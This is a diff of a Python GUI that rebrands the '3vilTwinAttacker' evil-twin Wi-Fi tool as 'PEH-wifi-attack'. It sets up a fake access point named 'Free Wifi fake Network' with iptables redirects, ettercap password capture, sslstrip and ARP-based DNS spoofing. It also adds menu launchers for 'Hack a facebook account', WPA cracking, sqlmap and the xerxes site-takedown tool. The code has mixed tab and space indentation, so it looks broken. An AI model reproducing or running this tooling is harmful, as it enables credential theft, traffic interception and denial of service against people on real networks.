@@ -7,7 +7,7 @@ from re import search
 from os import geteuid,mkdir,system,path,getcwd,chdir,remove,popen
 from sys import argv
 if search("/usr/share/",argv[0]):
-    chdir("/usr/share/3vilTwinAttacker/")
+    chdir("/usr/share/PEH-wifi-attack/")
 from Modules.DHCPstarvation import frm_dhcp_Attack,frm_dhcp_main
 from Modules.deauth_func import frm_window
 from Modules.mac_change_func import frm_mac_generator
@@ -21,19 +21,24 @@ from Core.Settings import frm_Settings
 from Modules.AttackUp import frm_WinSoftUp
 from Core.update import frm_Update
 from Modules.arps_Posion import frm_Arp_Poison
-__author__ = ' @mh4x0f P0cl4bs Team'
+__author__= "@mh4x0f P0cl4bs Team"
 __version__= "0.5.9"
 __date_create__= "18/01/2015"
-__update__="29/03/2015"
+__update__="07/06/2015"
+__edited_by__= "h@ck3rb0lt freelancer"
+__edited_version__= "0.6.0"
+__edited_date__= "25/06/2015"
+__edited_update__= "soon as possible"
 
 class frmControl(QMainWindow):
     def __init__(self, parent=None):
         super(frmControl, self).__init__(parent)
         self.form_widget = frm_main(self)
         self.setCentralWidget(self.form_widget)
-        self.setWindowTitle("3vilTwin-Attacker v" + __version__)
+        self.setWindowTitle("PEH-wifi-attack  " + __edited_version__)
         self.config = frm_Settings()
         self.loadtheme(self.config.XmlThemeSelected())
+
 
     def loadtheme(self,theme):
         if theme != "theme2":
@@ -61,7 +66,8 @@ class frm_main(QWidget):
         self.module_arp = frm_Arp_Poison()
         self.intGUI()
         self.setGeometry(0, 0, 300, 400)
-        self.interface = "mon0"
+        self.interface = "wlan"
+
 
     def intGUI(self):
         self.myQMenuBar = QMenuBar(self)
@@ -153,6 +159,51 @@ class frm_main(QWidget):
         Menu_module.addAction(btn_arp)
         Menu_module.addAction(action_settings)
 
+
+        Menu_peh_toolkit = self.myQMenuBar.addMenu("&PEH-toolkit")
+	btn_tutorial = QAction("PEH-toolkit-Tutorial", self)
+        btn_ping = QAction("Start a ping your target", self)
+        btn_whois = QAction("Start a whois search",self)
+        btn_dork3r = QAction("Dork3r vuln analizer", self)
+        btn_sqlmap = QAction("SQLMAP", self)
+        btn_hackfacebook = QAction("Hack a facebook account",self)
+        btn_wifite = QAction("Hack wpe/wpa wifi",self)
+        btn_apf = QAction("Find the admin page control",self)
+        btn_nmap = QAction("Launched a scan whit NMAP",self)
+        btn_theharvester = QAction("Identify different domain and different emails",self)
+        btn_fierce = QAction("Retrieve information about the dns",self)
+        btn_footprint = QAction("<<<<Hackerbolt Ultimate Footprint>>>>>",self)
+        btn_xerxes = QAction("Shutdown a web site / xerxes tool",self)
+
+	btn_tutorial.triggered.connect(self.start_tutorial)
+	btn_ping.triggered.connect(self.start_ping)
+	btn_whois.triggered.connect(self.start_whois)
+	btn_dork3r.triggered.connect(self.start_dork3r)
+	btn_sqlmap.triggered.connect(self.start_sqlmap)
+	btn_hackfacebook.triggered.connect(self.start_hackfacebook)
+	btn_wifite.triggered.connect(self.start_wifite)
+	btn_apf.triggered.connect(self.start_apf)
+	btn_nmap.triggered.connect(self.start_nmap)
+	btn_theharvester.triggered.connect(self.start_theharvester)
+	btn_fierce.triggered.connect(self.start_fierce)
+	btn_footprint.triggered.connect(self.start_footprint)
+	btn_xerxes.triggered.connect(self.start_xerxes)
+
+	Menu_peh_toolkit.addAction(btn_tutorial)
+	Menu_peh_toolkit.addAction(btn_ping)
+	Menu_peh_toolkit.addAction(btn_whois)
+	Menu_peh_toolkit.addAction(btn_dork3r)
+	Menu_peh_toolkit.addAction(btn_sqlmap)
+	Menu_peh_toolkit.addAction(btn_hackfacebook)
+	Menu_peh_toolkit.addAction(btn_wifite)
+	Menu_peh_toolkit.addAction(btn_apf)
+	Menu_peh_toolkit.addAction(btn_nmap)
+	Menu_peh_toolkit.addAction(btn_theharvester)
+	Menu_peh_toolkit.addAction(btn_fierce)
+	Menu_peh_toolkit.addAction(btn_footprint)
+	Menu_peh_toolkit.addAction(btn_xerxes)
+
+
         Menu_extra= self.myQMenuBar.addMenu("&Extra")
         Menu_about = QAction("About",self)
         Menu_help = QAction("Help",self)
@@ -182,7 +233,8 @@ class frm_main(QWidget):
             x = self.config.xmlSettings("local1", "gateway",None,False)
             self.input_gw.setText(x)
 
-        self.input_AP.setText("Example AP")
+	self.input_gw.setText("192.168.1.0 / dsldevice.lan")
+        self.input_AP.setText("Free Wifi fake Network")
         self.input_canal.setText("11")
 
         n = self.mod_import.placa()
@@ -215,15 +267,16 @@ class frm_main(QWidget):
         vbox.addStretch(20)
         self.form.addRow(vbox)
 
-        self.logo = QPixmap(getcwd() + "/rsc/logo.png")
+        self.logo = QPixmap(getcwd() + "/rsc/logo.jpg")
         self.label_imagem = QLabel()
         self.label_imagem.setPixmap(self.logo)
         self.form.addRow(self.label_imagem)
 
-        self.form.addRow("Gateway:", self.input_gw)
-        self.form.addRow("AP Name:", self.input_AP)
+
+        self.form.addRow("Gateway/IP:", self.input_gw)
+        self.form.addRow("Fake Network Name:", self.input_AP)
         self.form.addRow("Channel:", self.input_canal)
-        #self.form.addRow("Network Card List:", self.w)
+        self.form.addRow("Network Card List:", self.w)
 
         # grid network adapter fix
         self.btrn_refresh = QPushButton("Refresh")
@@ -256,6 +309,47 @@ class frm_main(QWidget):
         self.Main.addLayout(self.form2)
         self.setLayout(self.Main)
 
+    def start_tutorial(self):
+        if self.m[1] != False:
+            system("sudo xterm -geometry 80x45-1+250  tutorial ")
+    def start_ping(self):
+        if self.m[1] != False:
+            system("sudo xterm -geometry 80x25-1+250  ping ")
+    def start_whois(self):
+        if self.m[2] != False:
+            system("sudo xterm -geometry 80x25-1+250 PEHwhois")
+    def start_dork3r(self):
+        if self.m[1] != False:
+            system("sudo xterm -geometry 80x25-1+250 dork3r")
+    def start_sqlmap(self):
+        if self.m[4] != False:
+            system("sudo xterm -geometry 80x25-1+250 PEHsqlmap")
+    def start_hackfacebook(self):
+        if self.m[1] != False:
+            system("sudo xterm -geometry 80x25-1+250 facebook")
+    def start_wifite(self):
+        if self.m[2] != False:
+            system("sudo xterm -geometry 80x25-1+250 wifite")
+    def start_apf(self):
+        if self.m[1] != False:
+            system("sudo xterm -geometry 80x25-1+250 APF")
+    def start_nmap(self):
+        if self.m[4] != False:
+            system("sudo xterm -geometry 80x25-1+250  PEHnmap")
+    def start_theharvester(self):
+        if self.m[1] != False:
+            system("sudo xterm -geometry 80x25-1+250 PEHtheharvester")
+    def start_fierce(self):
+        if self.m[4] != False:
+            system("sudo xterm -geometry 80x25-1+250 PEHfierce")
+    def start_footprint(self):
+        if self.m[4] != False:
+            system("sudo xterm -geometry 80x25-1+250 footprint")
+    def start_xerxes(self):
+        if self.m[4] != False:
+            system("sudo xterm -geometry 80x25-1+250 xerxes")
+
+
     def show_update(self):
         self.n = frm_Update()
         self.n.show()
@@ -286,7 +380,7 @@ class frm_main(QWidget):
 
     def showProbe(self):
         self.p = frm_PMonitor()
-        self.p.setGeometry(QRect(100, 100, 400, 200))
+        self.p.setGeometry(QRect(100, 100, 350, 200))
         self.p.show()
 
     def newwindow(self):
@@ -313,7 +407,7 @@ class frm_main(QWidget):
     def kill(self):
         nano = ["echo \"0\" > /proc/sys/net/ipv4/ip_forward","iptables --flush",  "iptables --table nat --flush" ,\
                 "iptables --delete-chain", "iptables --table nat --delete-chain", \
-                "airmon-ng stop mon0" , "rm Settings/confiptables.sh" , \
+                "airmon-ng stop wlan0mon && airmon-ng stop wlan1mon && airmon-ng stop wlan2mon" , "rm Settings/confiptables.sh" , \
                  "ifconfig lo down","ifconfig at0 down &"]
         for delete in nano:
             system(delete)
@@ -324,16 +418,16 @@ class frm_main(QWidget):
 
     def start_etter(self):
         if self.m[1] != False:
-            system("sudo xterm -geometry 73x25-1+50 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w passwords -i at0 & ettercapid=$!")
+            system("sudo xterm -geometry 73x25-1+50 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w passwords -i lo & ettercapid=$!")
     def start_ssl(self):
         if self.m[2] != False:
             system("sudo xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -k -l 10000 & sslstripid=$!")
     def start_dns(self):
         if self.m[1] != False:
-            system("sudo xterm -geometry 73x25-1+250 -T DNSSpoof -e ettercap -P dns_spoof -T -q -M arp // // -i at0 & dnscapid=$!")
+            system("sudo xterm -geometry 73x25-1+250 -T DNSSpoof -e ettercap -P dns_spoof -T -q -M arp // // -i lo & dnscapid=$!")
     def start_dift(self):
         if self.m[4] != False:
-            system("sudo xterm -geometry 75x15+1+200 -T DriftNet -e driftnet -i at0 & driftnetid=$!")
+            system("sudo xterm -geometry 75x15+1+200 -T DriftNet -e driftnet -i lo & driftnetid=$!")
 
     def configure(self):
 
@@ -355,14 +449,14 @@ range 10.0.0.20 10.0.0.50;
             move("Settings/dhcpd.conf", "/etc/dhcp/")
         else:
             move("Settings/dhcpd.conf", "/etc/dhcp/")
-        self.listbox.addItem("{+} Setting interface at0 Network...")
+        self.listbox.addItem("{+} Setting interface lo Network...")
         self.conf_iptables = open("Settings/confiptables.sh", "w")
         self.conf_iptables.write("""echo "[+] Setting iptables..."
 ifconfig lo up
 ifconfig at0 up &
 sleep 1
-ifconfig at0 10.0.0.1 netmask 255.255.255.0
-ifconfig at0 mtu 1400
+ifconfig lo 10.0.0.1 netmask 255.255.255.0
+ifconfig lo mtu 1400
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 iptables --flush
 iptables --table nat --flush
@@ -371,14 +465,14 @@ iptables --table nat --delete-chain
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A PREROUTING -p udp -j DNAT --to %s
 iptables -P FORWARD ACCEPT
-iptables --append FORWARD --in-interface at0 -j ACCEPT
+iptables --append FORWARD --in-interface lo -j ACCEPT
 iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 iptables --table nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s
 iptables -t nat -A POSTROUTING -j MASQUERADE
 echo "[+] Startup DHCP..."
 touch /var/run/dhcpd.pid
-sudo  dhcpd -d -f -cf \"/etc/dhcp/dhcpd.conf\" at0
+sudo  dhcpd -d -f -cf \"/etc/dhcp/dhcpd.conf\" lo
 sleep 3
 """%(self.input_gw.text(),self.w.currentText(),str(self.mod_import.get_ip_local(None))))
         self.conf_iptables.close()
@@ -396,6 +490,7 @@ sleep 3
             QMessageBox.information(self,"Error", "Network interface not supported :(")
         else:
             if path.exists("Settings/"):
+                print(":::")
                 if not geteuid() == 0:
                     QMessageBox.information(self, "Permission Denied", 'the Tool must be run as root try again.')
                     dot = 0
@@ -412,16 +507,16 @@ sleep 3
 
     def Edit_etter(self):
         n = dist()
-        if n[0] == "Ubuntu" or n[0] == "Kali":
+        if n[0] == "Ubuntu":
             system("xterm -e nano /etc/ettercap/etter.dns")
         elif n[0] == "debian":
-            system("xterm -e nano /usr/share/ettercap/etter.dns")
+            system("xterm -e nano /etc/ettercap/etter.dns")
         else:
             QMessageBox.information(self,"Error", "Path etter.dns not found")
 
     def create_sys_tray(self):
         self.sysTray = QSystemTrayIcon(self)
-        self.sysTray.setIcon(QIcon('rsc/icon.ico'))
+        self.sysTray.setIcon(QIcon('rsc/icon.jpg'))
         self.sysTray.setVisible(True)
         self.connect(self.sysTray, SIGNAL("activated(QSystemTrayIcon::ActivationReason)"), self.on_sys_tray_activated)
 
@@ -434,12 +529,17 @@ sleep 3
         elif reason == 2:
             self.showMinimized()
     def about(self):
-        QMessageBox.about(self, self.tr("About 3vilTiwn Attacker"),
+        QMessageBox.about(self, self.tr("About PEH-wifi-attack"),
             self.tr(
-                    "Version:%s\n"
-                    "Update:%s\n"
-                    "Emails: \np0cL4bs@gmail.com\n"
-                    "mh4root@gmail.com\n\n"
-                    "The MIT License (MIT)\n"
                     "Author:%s\n"
-                    "Copyright(c) 2015\n"% ( __version__, __update__, __author__)))
+                    "Version:%s\n"
+                    "The MIT License (MIT)\n"
+		    "Emails of the Author: \np0cL4bs@gmail.com\n"
+                    "mh4root@gmail.com\n\n"
+                    "edited_by:%s\n"
+		    "edited_version:%s\n"
+		    "edited_date:%s\n"
+                    "Emails: \nhackerbolt@outlook.com\n"
+                    "hackerbolt@hotmail.com\n\n"
+                    "Portuguese Ethical Hacker Academy (PEH)\n"
+                    "Copyright(c) 2015\n"% ( __author__, __version__, __edited_by__, __edited_version__, __edited_date__ )))
